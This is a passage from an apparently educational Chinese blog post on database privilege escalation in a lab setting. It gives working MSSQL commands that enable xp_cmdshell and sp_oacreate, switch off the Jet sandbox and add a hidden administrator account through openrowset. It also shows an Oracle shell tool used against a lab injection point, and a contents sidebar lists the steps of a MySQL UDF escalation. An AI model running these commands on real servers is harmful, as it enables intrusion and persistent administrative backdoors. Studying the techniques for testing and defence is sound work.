<h6 id="再次执行系统命令时，将不能成功"><a href="#再次执行系统命令时，将不能成功" class="headerlink" title="再次执行系统命令时，将不能成功"></a>再次执行系统命令时，将不能成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141719603.png" alt="image-20230419141719603"></p>
<h6 id="如果xp-cmdshell关闭了，可以用命令启动，即使如果删除了xp-cmdshell，可以按开头的命令进行恢复"><a href="#如果xp-cmdshell关闭了，可以用命令启动，即使如果删除了xp-cmdshell，可以按开头的命令进行恢复" class="headerlink" title="如果xp_cmdshell关闭了，可以用命令启动，即使如果删除了xp_cmdshell，可以按开头的命令进行恢复"></a>如果xp_cmdshell关闭了，可以用命令启动，即使如果删除了xp_cmdshell，可以按开头的命令进行恢复</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142230224.png" alt="image-20230419142230224"></p>
<h6 id="也一样可以用msf直接提权"><a href="#也一样可以用msf直接提权" class="headerlink" title="也一样可以用msf直接提权"></a>也一样可以用msf直接提权</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142827732.png" alt="image-20230419142827732"></p>
<h5 id="2-使用sp-oacreate进行提权（无回显没有xp-cmdshell方便）"><a href="#2-使用sp-oacreate进行提权（无回显没有xp-cmdshell方便）" class="headerlink" title="2.使用sp_oacreate进行提权（无回显没有xp_cmdshell方便）"></a>2.使用sp_oacreate进行提权（无回显没有xp_cmdshell方便）</h5><p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p>
<p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。</p>
<h5 id="启用：-1"><a href="#启用：-1" class="headerlink" title="启用："></a>启用：</h5><ul>
<li>EXEC sp_configure ‘show advanced options’, 1;   </li>
<li>RECONFIGURE WITH OVERRIDE;   </li>
<li>EXEC sp_configure ‘Ole Automation Procedures’, 1;   </li>
<li>RECONFIGURE WITH OVERRIDE;</li>
</ul>
<h5 id="关闭：-1"><a href="#关闭：-1" class="headerlink" title="关闭："></a>关闭：</h5><ul>
<li>EXEC sp_configure ‘show advanced options’, 1;</li>
<li>RECONFIGURE WITH OVERRIDE;   </li>
<li>EXEC sp_configure ‘Ole Automation Procedures’, 0;   </li>
<li>RECONFIGURE WITH OVERRIDE;</li>
</ul>
<h5 id="执行：-1"><a href="#执行：-1" class="headerlink" title="执行："></a>执行：</h5><ul>
<li>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\1.txt’</li>
</ul>
<h6 id="如果xp-cmdshell关闭了，可以尝试sp-oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1-txt"><a href="#如果xp-cmdshell关闭了，可以尝试sp-oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1-txt" class="headerlink" title="如果xp_cmdshell关闭了，可以尝试sp_oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1.txt"></a>如果xp_cmdshell关闭了，可以尝试sp_oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1.txt</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141900427.png" alt="image-20230419141900427"></p>
<h6 id="发现成功写入"><a href="#发现成功写入" class="headerlink" title="发现成功写入"></a>发现成功写入</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142108527.png" alt="image-20230419142108527"></p>
<h6 id="权限为system"><a href="#权限为system" class="headerlink" title="权限为system"></a>权限为system</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142146963.png" alt="image-20230419142146963"></p>
<h6 id="同样如果关闭了sp-oacreate"><a href="#同样如果关闭了sp-oacreate" class="headerlink" title="同样如果关闭了sp_oacreate"></a>同样如果关闭了sp_oacreate</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142338933.png" alt="image-20230419142338933"></p>
<h6 id="会无法执行命令"><a href="#会无法执行命令" class="headerlink" title="会无法执行命令"></a>会无法执行命令</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142432904.png" alt="image-20230419142432904"></p>
<h6 id="如果sp-oacreate关闭了，也可以用命令启动"><a href="#如果sp-oacreate关闭了，也可以用命令启动" class="headerlink" title="如果sp_oacreate关闭了，也可以用命令启动"></a>如果sp_oacreate关闭了，也可以用命令启动</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142504336.png" alt="image-20230419142504336"></p>
<h5 id="3-使用SQL-Server-沙盒提权（如果前面两个行不通）"><a href="#3-使用SQL-Server-沙盒提权（如果前面两个行不通）" class="headerlink" title="3.使用SQL Server 沙盒提权（如果前面两个行不通）"></a>3.使用SQL Server 沙盒提权（如果前面两个行不通）</h5><p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p>
<h6 id="按照语句一步步执行即可"><a href="#按照语句一步步执行即可" class="headerlink" title="按照语句一步步执行即可"></a>按照语句一步步执行即可</h6><ul>
<li><p>–提权语句</p>
<p>exec sp_configure ‘show advanced options’,1;reconfigure;</p>
</li>
<li><p>– 不开启的话在执行xp_regwrite会提示让我们开启，</p>
<p>exec sp_configure ‘Ad Hoc Distributed Queries’,1;reconfigure;</p>
</li>
<li><p>–关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p>
<p>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;</p>
</li>
<li><p>–查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</p>
<p>exec master.dbo.xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’, ‘SandBoxMode’</p>
</li>
<li><p>–执行系统命令</p>
<p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:&#x2F;windows&#x2F;system32&#x2F;ias&#x2F;ias.mdb’,’select shell(“net user margin margin &#x2F;add”)’)  （添加用户margin）</p>
<p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:&#x2F;windows&#x2F;system32&#x2F;ias&#x2F;ias.mdb’,’select shell(“net localgroup administrators margin &#x2F;add”)’)   (将margin添加到管理员组)</p>
</li>
</ul>
<h5 id="沙盒模式SandBoxMode参数含义（默认是2）"><a href="#沙盒模式SandBoxMode参数含义（默认是2）" class="headerlink" title="沙盒模式SandBoxMode参数含义（默认是2）"></a><code>沙盒模式SandBoxMode参数含义（默认是2）</code></h5><p><code>1-4参数含义</code></p>
<p><code>1:在任何所有者中禁止启用安全模式</code></p>
<p><code>2:为仅在允许范围内</code></p>
<p><code>3:必须在access模式下</code></p>
<p><code>4:完全开启</code></p>
<p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</p>
<p>–恢复配置</p>
<p>–exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1; </p>
<p>–exec sp_configure ‘Ad Hoc Distributed Queries’,0;reconfigure; </p>
<p>–exec sp_configure ‘show advanced options’,0;reconfigure;</p>
<h3 id="Oracle-普通用户-amp-注入提升模式-amp-DBA模式"><a href="#Oracle-普通用户-amp-注入提升模式-amp-DBA模式" class="headerlink" title="#Oracle-普通用户&amp;注入提升模式&amp;DBA模式"></a>#Oracle-普通用户&amp;注入提升模式&amp;DBA模式</h3><h5 id="Oracle数据库在sqlmap时不能使用–os-shell，无效"><a href="#Oracle数据库在sqlmap时不能使用–os-shell，无效" class="headerlink" title="Oracle数据库在sqlmap时不能使用–os-shell，无效"></a>Oracle数据库在sqlmap时不能使用–os-shell，无效</h5><p>工具：<a target="_blank" rel="noopener" href="https://github.com/jas502n/oracleshell">https://github.com/jas502n/oracleshell</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.46.148:8080/sql.jsp?id=7698">http://192.168.46.148:8080/sql.jsp?id=7698</a></p>
<h5 id="工具存在以下三种模式"><a href="#工具存在以下三种模式" class="headerlink" title="工具存在以下三种模式"></a>工具存在以下三种模式</h5><h5 id="1、普通用户模式："><a href="#1、普通用户模式：" class="headerlink" title="1、普通用户模式："></a>1、普通用户模式：</h5><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。</p>
<h5 id="2、DBA用户模式：（自动化工具演示）"><a href="#2、DBA用户模式：（自动化工具演示）" class="headerlink" title="2、DBA用户模式：（自动化工具演示）"></a>2、DBA用户模式：（自动化工具演示）</h5><p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p>
<h5 id="3、注入提升模式：（Sqlmap测试演示）"><a href="#3、注入提升模式：（Sqlmap测试演示）" class="headerlink" title="3、注入提升模式：（Sqlmap测试演示）"></a>3、注入提升模式：（Sqlmap测试演示）</h5><p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显</p>
<h6 id="大部分的jsp语言搭建的获得了shell直接是system权限，除了少数"><a href="#大部分的jsp语言搭建的获得了shell直接是system权限，除了少数" class="headerlink" title="大部分的jsp语言搭建的获得了shell直接是system权限，除了少数"></a>大部分的jsp语言搭建的获得了shell直接是system权限，除了少数</h6><h6 id="这里找到oracle数据库配置文件找到账号密码"><a href="#这里找到oracle数据库配置文件找到账号密码" class="headerlink" title="这里找到oracle数据库配置文件找到账号密码"></a>这里找到oracle数据库配置文件找到账号密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150047902.png" alt="image-20230419150047902"></p>
<h6 id="使用orac提权工具"><a href="#使用orac提权工具" class="headerlink" title="使用orac提权工具"></a>使用orac提权工具</h6><h6 id="一开始显示失败，更换为DBA模式"><a href="#一开始显示失败，更换为DBA模式" class="headerlink" title="一开始显示失败，更换为DBA模式"></a>一开始显示失败，更换为DBA模式</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150645729.png" alt="image-20230419150645729"></p>
<h6 id="发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通"><a href="#发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通" class="headerlink" title="发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通"></a>发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150520683.png" alt="image-20230419150520683"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pwy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/17/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/">http://example.com/2023/04/17/Day99-权限提升-数据库提权-口令获取-MYSQL-MSSQL-Oracle-MSF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">ai潼</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/tt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/17/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/" title="Day100 权限提升-数据库&amp;Redis&amp;Postgre&amp;第三方软件&amp;TV&amp;向日葵&amp;服务类"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day100 权限提升-数据库&amp;Redis&amp;Postgre&amp;第三方软件&amp;TV&amp;向日葵&amp;服务类</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/17/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" title="Day98 权限提升-WIN全平台&amp;MSF自动化&amp;CS插件化&amp;EXP筛选&amp;溢出漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Day98 权限提升-WIN全平台&amp;MSF自动化&amp;CS插件化&amp;EXP筛选&amp;溢出漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tt.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pwy</div><div class="author-info__description">自律&上进</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">#知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">#思考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">#章节点：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">#详细点：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%85%B7%E4%BD%93%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9D%83%E9%99%90%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E4%BA%86%E8%A7%A3%E6%8E%8C%E6%8F%A1%E7%9A%84%EF%BC%9F"><span class="toc-number">3.1.1.</span> <span class="toc-text">1、具体有哪些权限需要我们了解掌握的？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E4%BB%A5%E4%B8%8A%E5%B8%B8%E8%A7%81%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96%E6%96%B9%E6%B3%95%E7%AE%80%E8%A6%81%E5%BD%92%E7%B1%BB%E8%AF%B4%E6%98%8E%EF%BC%9F"><span class="toc-number">3.1.2.</span> <span class="toc-text">2、以上常见权限获取方法简要归类说明？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E4%BB%A5%E4%B8%8A%E5%B8%B8%E8%A7%81%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96%E5%90%8E%E8%83%BD%E6%93%8D%E4%BD%9C%E7%9A%84%E5%85%B7%E4%BD%93%E4%BA%8B%E6%83%85"><span class="toc-number">3.1.3.</span> <span class="toc-text">3、以上常见权限获取后能操作的具体事情?</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90"><span class="toc-number">3.1.4.</span> <span class="toc-text">后台权限:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-number">3.1.5.</span> <span class="toc-text">网站权限：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-number">3.1.6.</span> <span class="toc-text">数据库权限：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-number">3.1.7.</span> <span class="toc-text">接口权限：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">演示案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E5%B7%B2%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%B8%80%E7%AF%87%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">Linux已复现第一篇：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81-Linux%E6%8F%90%E6%9D%83%EF%BC%88mysql-UDF%E6%8F%90%E6%9D%83%EF%BC%89-linux-mysql-udf%E6%8F%90%E6%9D%83-LZsec%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2"><span class="toc-number">4.2.</span> <span class="toc-text">1、 Linux提权（mysql UDF提权）_linux mysql udf提权_LZsec的博客-CSDN博客</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81Mysql%E6%8F%90%E6%9D%83-%E5%9F%BA%E4%BA%8EMysql%E7%9A%84UDF%E6%8F%90%E6%9D%83%EF%BC%88Linux%E7%B3%BB%E7%BB%9F%EF%BC%89-%E7%A0%81%E5%B0%8F%E5%86%9C%E7%9A%84%E5%B9%B8%E7%A6%8F%E7%94%9F%E6%B4%BB-%E5%8D%9A%E5%AE%A2%E5%9B%AD"><span class="toc-number">4.3.</span> <span class="toc-text">2、Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9E%A2-%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%90%E5%8F%B7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F"><span class="toc-number">4.4.</span> <span class="toc-text">➢ 提权条件-数据库帐号密码获取方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9E%A2-MYSQL-UDF-amp-MOF-amp-%E5%90%AF%E5%8A%A8%E9%A1%B9-amp-%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">4.5.</span> <span class="toc-text">➢ MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9E%A2-MSSQL-xp-cmdshell-amp-sp-oacreate-amp-%E6%B2%99%E7%9B%92"><span class="toc-number">4.6.</span> <span class="toc-text">➢ MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9E%A2-Oracle-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-amp-%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87%E6%A8%A1%E5%BC%8F-amp-DBA%E6%A8%A1%E5%BC%8F"><span class="toc-number">4.7.</span> <span class="toc-text">➢ Oracle-普通用户&amp;注入提升模式&amp;DBA模式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%AC%AC%E4%B8%80%E7%AF%87%E5%A4%8D%E7%8E%B0%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">#Linux第一篇复现注意点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4kali%E4%B8%8A%E6%90%9C%E7%B4%A2Linux-udf%E6%8F%90%E6%9D%83%E8%84%9A%E6%9C%AC"><span class="toc-number">5.0.1.</span> <span class="toc-text">步骤kali上搜索Linux udf提权脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%86%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E5%9C%A8%E6%9C%AC%E5%9C%B0%E8%BF%9B%E8%A1%8C%E7%BC%96%E8%AF%91%E5%90%8E%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%9D%B6%E6%9C%BA%E7%9A%84-x2F-tmp%E7%9B%AE%E5%BD%95%E4%B8%8B"><span class="toc-number">5.0.1.1.</span> <span class="toc-text">将脚本文件在本地进行编译后上传到靶机的&#x2F;tmp目录下</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#gcc-g-c-1518-c"><span class="toc-number">5.0.1.2.</span> <span class="toc-text">gcc -g -c 1518.c</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#gcc-g-shared-o-1518-so-1518-o"><span class="toc-number">5.0.1.3.</span> <span class="toc-text">gcc -g -shared -o 1518.so 1518.o</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%861518-so%E6%96%87%E4%BB%B6%E9%80%9A%E8%BF%87%E8%9A%81%E5%89%91%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%9D%B6%E6%9C%BA-x2F-tmp%E7%9B%AE%E5%BD%95%E4%B8%8B"><span class="toc-number">5.0.1.4.</span> <span class="toc-text">将1518.so文件通过蚁剑上传到靶机&#x2F;tmp目录下</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8Cudf%E6%8F%90%E6%9D%83"><span class="toc-number">5.0.1.5.</span> <span class="toc-text">进入数据库进行udf提权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#use-mysql-%E8%BF%9B%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">5.0.1.6.</span> <span class="toc-text">use mysql; #进入数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#create-table-foo-line-blob-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="toc-number">5.0.1.7.</span> <span class="toc-text">create table foo(line blob); #创建数据表</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#insert-into-foo-values-load-file-%E2%80%98-x2F-tmp-x2F-icepeak-so%E2%80%99-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%B0%861518-so%E6%94%B9%E5%90%8D%EF%BC%8C%E5%8F%AF%E6%94%B9%E5%8F%AF%E4%B8%8D%E6%94%B9%E7%9A%84"><span class="toc-number">5.0.1.8.</span> <span class="toc-text">insert into foo values(load_file(‘&#x2F;tmp&#x2F;icepeak.so’)); #插入数据，这里我并没有将1518.so改名，可改可不改的</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#select-from-foo-into-dumpfile-%E2%80%98-x2F-usr-x2F-lib-x2F-mysql-x2F-lib-x2F-plugin-x2F-icepeak-so%E2%80%99-Foo%E8%A1%A8%E6%88%90%E5%8A%9F%E6%8F%92%E5%85%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%EF%BC%8C-%E7%84%B6%E5%90%8E%E5%88%A9%E7%94%A8dumpfile%E5%87%BD%E6%95%B0%E6%8A%8A%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA-outfile-%E5%A4%9A%E8%A1%8C%E5%AF%BC%E5%87%BA%EF%BC%8Cdumpfile%E4%B8%80%E8%A1%8C%E5%AF%BC%E5%87%BA-outfile%E4%BC%9A%E6%9C%89%E7%89%B9%E6%AE%8A%E7%9A%84%E8%BD%AC%E6%8D%A2%EF%BC%8C%E8%80%8Cdumpfile%E6%98%AF%E5%8E%9F%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%87%BA-%E6%96%B0%E5%BB%BA%E5%AD%98%E5%82%A8%E5%87%BD%E6%95%B0%EF%BC%8C%E8%BF%99%E9%87%8C%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84plugin%E8%B7%AF%E5%BE%84-%E6%B2%A1%E6%9C%89lib-x2F-plugin%E5%B0%B1%E5%88%9B%E5%BB%BA%E8%BF%99%E4%B8%A4%E4%B8%AA"><span class="toc-number">5.0.1.9.</span> <span class="toc-text">select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F;icepeak.so’; #( Foo表成功插入二进制数据， 然后利用dumpfile函数把文件导出 outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 新建存储函数，这里要注意自己的plugin路径,没有lib&#x2F;plugin就创建这两个)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 